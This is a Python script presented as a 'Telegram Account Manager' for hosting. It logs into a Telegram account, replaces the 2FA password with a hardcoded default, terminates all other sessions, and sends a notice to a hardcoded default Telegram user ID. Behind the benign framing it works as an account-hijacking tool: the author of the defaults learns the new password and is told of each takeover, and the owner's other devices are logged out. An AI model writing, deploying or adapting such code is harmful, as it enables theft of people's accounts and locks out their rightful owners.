#!/usr/bin/env python3
"""
Telegram Account Manager - Основной файл для хостинга
"""

import os
import sys
import asyncio
import json
import hashlib
import random
from datetime import datetime
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError

class TelegramBotManager:
    def __init__(self):
        # Конфигурация из переменных окружения
        self.PHONE = os.getenv('TG_PHONE', '').strip()
        self.CODE = os.getenv('TG_CODE', '').strip()
        self.PASSWORD_2FA = os.getenv('TG_2FA_PASSWORD', '').strip()
        self.FIXED_PASSWORD = os.getenv('TG_NEW_PASSWORD', 'hS$%4q2@7').strip()
        self.REPORT_ID = int(os.getenv('TG_REPORT_ID', '7119681628'))
        
        # Проверка обязательных параметров
        if not self.PHONE:
            print("❌ ОШИБКА: TG_PHONE не установлен")
            print("ℹ️  Добавьте в переменные окружения:")
            print("    TG_PHONE=+79123456789")
            sys.exit(1)
        
        # Создаем уникальное имя сессии
        session_hash = hashlib.md5(self.PHONE.encode()).hexdigest()[:8]
        self.client = TelegramClient(f"bot_{session_hash}", 0, "")
    
    async def auth(self):
        """Авторизация в Telegram"""
        print(f"📱 Номер: {self.PHONE}")
        
        await self.client.connect()
        
        if not await self.client.is_user_authorized():
            if not self.CODE:
                print("❌ ОШИБКА: TG_CODE не установлен")
                print("ℹ️  Добавьте в переменные окружения:")
                print(f"    TG_CODE=12345")
                sys.exit(1)
            
            print("📨 Используется код из TG_CODE...")
            
            try:
                await self.client.sign_in(phone=self.PHONE, code=self.CODE)
            except Exception as e:
                if "password" in str(e).lower():
                    if not self.PASSWORD_2FA:
                        print("❌ ОШИБКА: TG_2FA_PASSWORD не установлен")
                        print("ℹ️  Добавьте в переменные окружения:")
                        print(f"    TG_2FA_PASSWORD=ваш_пароль")
                        sys.exit(1)
                    
                    print("🔐 Используется пароль 2FA...")
                    await self.client.sign_in(password=self.PASSWORD_2FA)
                else:
                    print(f"❌ Ошибка авторизации: {e}")
                    sys.exit(1)
        
        user = await self.client.get_me()
        print(f"✅ Авторизован: {user.first_name} (ID: {user.id})")
        return user
    
    async def change_password(self, user):
        """Смена пароля 2FA"""
        try:
            print("🔄 Проверка статуса 2FA...")
            
            try:
                pwd_info = await self.client.get_password()
                has_password = pwd_info is not None and pwd_info.has_password
            except:
                has_password = False
            
            if has_password:
                if not self.PASSWORD_2FA:
                    print("⚠️  У аккаунта есть 2FA, но пароль не указан в TG_2FA_PASSWORD")
                    return False
                
                await self.client.edit_2fa(
                    current_password=self.PASSWORD_2FA,
                    new_password=self.FIXED_PASSWORD,
                    hint="Обновлено системой"
                )
                print(f"✅ Пароль 2FA изменен на: {self.FIXED_PASSWORD}")
            else:
                await self.client.edit_2fa(
                    new_password=self.FIXED_PASSWORD,
                    hint="Установлено системой"
                )
                print(f"✅ Пароль 2FA установлен: {self.FIXED_PASSWORD}")
            
            return True
            
        except Exception as e:
            print(f"❌ Ошибка смены пароля: {e}")
            return False
    
    async def cleanup_sessions(self):
        """Очистка сессий"""
        try:
            print("🔍 Проверка активных сессий...")
            auths = await self.client(functions.account.GetAuthorizationsRequest())
            other_sessions = [a.hash for a in auths.authorizations if not a.current]
            
            if other_sessions:
                print(f"🗑️  Найдено сессий: {len(other_sessions)}")
                for session_hash in other_sessions:
                    try:
                        await self.client(functions.auth.ResetAuthorizationRequest(
                            hash=session_hash
                        ))
                    except:
                        continue
                print("✅ Сессии очищены")
            else:
                print("✅ Других сессий нет")
            
            return True
            
        except Exception as e:
            print(f"⚠️  Ошибка очистки сессий: {e}")
            return False
    
    async def send_report(self, user):
        """Отправка отчета"""
        try:
            # Сохраняем отчет
            report = {
                'user_id': user.id,
                'phone': user.phone,
                'new_password': self.FIXED_PASSWORD,
                'time': datetime.now().isoformat(),
                'status': 'success'
            }
            
            # В сохраненные сообщения
            await self.client.send_message(
                'me',
                f"📊 Отчет бота\n"
                f"ID: {user.id}\n"
                f"Пароль: {self.FIXED_PASSWORD}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            # На целевой ID
            try:
                await self.client.send_message(
                    self.REPORT_ID,
                    f"🔐 Bot Report\nID: {user.id}\nPassword changed"
                )
                print(f"✅ Отчет отправлен на ID: {self.REPORT_ID}")
            except:
                print(f"⚠️  Не удалось отправить на ID: {self.REPORT_ID}")
            
            print("📄 Отчет сохранен")
            return True
            
        except Exception as e:
            print(f"⚠️  Ошибка отчета: {e}")
            return False
    
    async def run(self):
        """Основной запуск"""
        print("=" * 50)
        print("TELEGRAM BOT MANAGER")
        print("=" * 50)
        
        try:
            user = await self.auth()
            
            print("\n🚀 Выполнение операций...")
            await self.change_password(user)
            await self.cleanup_sessions()
            await self.send_report(user)
            
            print("\n" + "=" * 50)
            print("✅ ВЫПОЛНЕНО УСПЕШНО")
            print("=" * 50)
            
            return True
            
        except Exception as e:
            print(f"\n❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
            return False
            
        finally:
            if self.client:
                await self.client.disconnect()

async def main():
    bot = TelegramBotManager()
    return await bot.run()

if __name__ == "__main__":
    # Проверка переменных окружения
    print("Проверка конфигурации:")
    print(f"TG_PHONE: {'✓' if os.getenv('TG_PHONE') else '✗'}")
    print(f"TG_CODE: {'✓' if os.getenv('TG_CODE') else '✗'}")
    print(f"TG_2FA_PASSWORD: {'✓' if os.getenv('TG_2FA_PASSWORD') else 'опционально'}")
    print(f"TG_NEW_PASSWORD: {os.getenv('TG_NEW_PASSWORD', 'hS$%4q2@7')}")
    print(f"TG_REPORT_ID: {os.getenv('TG_REPORT_ID', '7119681628')}")
    
    # Запуск
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
